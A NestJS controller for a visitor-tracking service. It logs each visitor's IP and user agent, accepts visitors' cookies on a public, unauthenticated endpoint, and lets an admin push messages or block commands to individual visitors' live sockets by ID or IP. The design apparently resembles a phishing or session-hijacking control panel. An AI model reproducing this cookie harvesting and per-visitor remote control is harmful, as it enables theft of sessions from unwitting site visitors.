import { AdminGuard } from "@/auth/guards/admin.guard";
import { firstForwardedIp, normalizeIp } from "@/common/http-ip.utils";
import {
  BadRequestException,
  Body,
  Controller,
  Get,
  HttpCode,
  HttpStatus,
  Param,
  Post,
  Query,
  Req,
  Res,
  UseGuards,
} from "@nestjs/common";
import {
  ApiBearerAuth,
  ApiOperation,
  ApiParam,
  ApiResponse,
  ApiTags,
} from "@nestjs/swagger";
import { Throttle } from "@nestjs/throttler";
import { Request, Response } from "express";
import { ok } from "./utils/response";

import { EventsGateway } from "./events.gateway";
import { VisitsService } from "./visits.service";

import { GetVisitsQuery } from "./dto/get-visits.query";
import { SaveCookiesDto } from "./dto/save-cookies.dto";
import { SendMessageByIpDto } from "./dto/send-message-by-ip.dto";
import { SendMessageBySocketDto } from "./dto/send-message-by-socket.dto";
import { TrackVisitDto } from "./dto/track-visit.dto";

@ApiTags("Visits")
@Controller("visits")
export class VisitsController {
  constructor(
    private readonly visitsService: VisitsService,
    private readonly eventsGateway: EventsGateway
  ) {}

  @ApiOperation({ summary: "Трекинг визита (публично)" })
  @ApiResponse({ status: 200, description: "Визит успешно зафиксирован" })
  @Throttle({ default: { limit: 5, ttl: 10 } })
  @Post()
  @HttpCode(HttpStatus.OK)
  async track(@Req() req: Request, @Body() body: TrackVisitDto) {
    const forwarded = firstForwardedIp(req.headers["x-forwarded-for"] as any);
    const rawIp = forwarded || req.socket.remoteAddress || "Unknown";
    const ip = normalizeIp(rawIp);
    const userAgent =
      body.userAgent || (req.headers["user-agent"] as string) || "Unknown";

    await this.visitsService.trackVisit({ ...body, ip, userAgent });
    return ok({ message: "Visit tracked", ip });
  }

  @ApiBearerAuth()
  @UseGuards(AdminGuard)
  @Get()
  @ApiOperation({ summary: "Список визитов с фильтрами и пагинацией (cursor)" })
  @ApiResponse({ status: 200, description: "Список визитов" })
  async getAll(@Query() q: GetVisitsQuery) {
    const { items, nextCursor } = await this.visitsService.findMany(q);
    return ok({ items, nextCursor });
  }

  @ApiBearerAuth()
  @UseGuards(AdminGuard)
  @Get("export.csv")
  @ApiOperation({ summary: "Экспорт визитов в CSV (с учётом фильтров)" })
  @ApiResponse({ status: 200, description: "CSV-файл сформирован" })
  async export(@Query() q: GetVisitsQuery, @Res() res: Response) {
    const csv = await this.visitsService.exportCsv(q);
    res.setHeader("Content-Type", "text/csv; charset=utf-8");
    res.setHeader("Content-Disposition", 'attachment; filename="visits.csv"');
    res.send(csv);
  }

  @ApiBearerAuth()
  @UseGuards(AdminGuard)
  @Get("by-socket/:socketId")
  @ApiOperation({ summary: "Получить визит по socketId" })
  @ApiResponse({ status: 200, description: "Информация о визите" })
  async getBySocket(@Param("socketId") socketId: string) {
    const item = await this.visitsService.getBySocketId(socketId);
    return ok(item);
  }

  @ApiBearerAuth()
  @UseGuards(AdminGuard)
  @Post("message")
  @ApiOperation({ summary: "Отправить сообщение по socketId" })
  @ApiResponse({ status: 200, description: "Сообщение отправлено" })
  @HttpCode(HttpStatus.OK)
  async sendMessage(@Body() body: SendMessageBySocketDto) {
    const { socketId, message, type = "text" } = body;

    if (type === "set-block" && !["true", "false"].includes(message)) {
      throw new BadRequestException(
        "Для типа 'set-block' сообщение должно быть 'true' или 'false'"
      );
    }

    await this.eventsGateway.sendMessageToSocketId(socketId, message, type);
    return ok({ message: `Sent to socket ${socketId}`, type });
  }

  @ApiBearerAuth()
  @UseGuards(AdminGuard)
  @Post("message-by-ip")
  @ApiOperation({ summary: "Отправить сообщение по IP-адресу" })
  @ApiResponse({ status: 200, description: "Сообщение отправлено" })
  @HttpCode(HttpStatus.OK)
  async sendMessageByIp(@Body() body: SendMessageByIpDto) {
    const { ip, message, type = "text" } = body;

    if (type === "set-block" && !["true", "false"].includes(message)) {
      throw new BadRequestException(
        "Для типа 'set-block' сообщение должно быть 'true' или 'false'"
      );
    }

    this.eventsGateway.sendMessageToIp(ip, message, type);
    return ok({ message: `Sent to IP ${ip}`, type });
  }

  @Post("cookies")
  @ApiOperation({ summary: "Сохранить cookies по socketId" })
  @ApiResponse({ status: 200, description: "Cookies успешно сохранены" })
  @HttpCode(HttpStatus.OK)
  async saveCookies(@Body() body: SaveCookiesDto) {
    await this.visitsService.saveCookies(body.socketId, body.cookies);
    return ok({ message: "Cookies saved" });
  }

  @ApiBearerAuth()
  @UseGuards(AdminGuard)
  @Post("block-all")
  @ApiOperation({ summary: "Заблокировать все визиты" })
  @ApiResponse({ status: 200, description: "Все визиты заблокированы" })
  @HttpCode(HttpStatus.OK)
  async blockAll() {
    const result = await this.visitsService.blockAll();
    return ok({ message: "All visits blocked", ...result });
  }

  @ApiBearerAuth()
  @UseGuards(AdminGuard)
  @Post("unblock-all")
  @ApiOperation({ summary: "Разблокировать все визиты" })
  @ApiResponse({ status: 200, description: "Все визиты разблокированы" })
  @HttpCode(HttpStatus.OK)
  async unblockAll() {
    const result = await this.visitsService.unblockAll();
    return ok({ message: "All visits unblocked", ...result });
  }

  @ApiBearerAuth()
  @UseGuards(AdminGuard)
  @Post("block/socket/:socketId")
  @ApiOperation({ summary: "Заблокировать визит по socketId" })
  @ApiParam({ name: "socketId", required: true })
  @ApiResponse({ status: 200, description: "Визит заблокирован" })
  async blockSocket(@Param("socketId") socketId: string) {
    const result = await this.visitsService.blockBySocketId(socketId);
    return ok(result);
  }

  @ApiBearerAuth()
  @UseGuards(AdminGuard)
  @Post("unblock/socket/:socketId")
  @ApiOperation({ summary: "Разблокировать визит по socketId" })
  @ApiParam({ name: "socketId", required: true })
  @ApiResponse({ status: 200, description: "Визит разблокирован" })
  async unblockSocket(@Param("socketId") socketId: string) {
    const result = await this.visitsService.unblockBySocketId(socketId);
    return ok(result);
  }

  @ApiBearerAuth()
  @UseGuards(AdminGuard)
  @Post("block/ip/:ip")
  @ApiOperation({ summary: "Заблокировать визит по IP" })
  @ApiParam({ name: "ip", required: true })
  @ApiResponse({ status: 200, description: "Визит заблокирован" })
  async blockIp(@Param("ip") ip: string) {
    const result = await this.visitsService.blockByIp(ip);
    return ok(result);
  }

  @ApiBearerAuth()
  @UseGuards(AdminGuard)
  @Post("unblock/ip/:ip")
  @ApiOperation({ summary: "Разблокировать визит по IP" })
  @ApiParam({ name: "ip", required: true })
  @ApiResponse({ status: 200, description: "Визит разблокирован" })
  async unblockIp(@Param("ip") ip: string) {
    const result = await this.visitsService.unblockByIp(ip);
    return ok(result);
  }
}
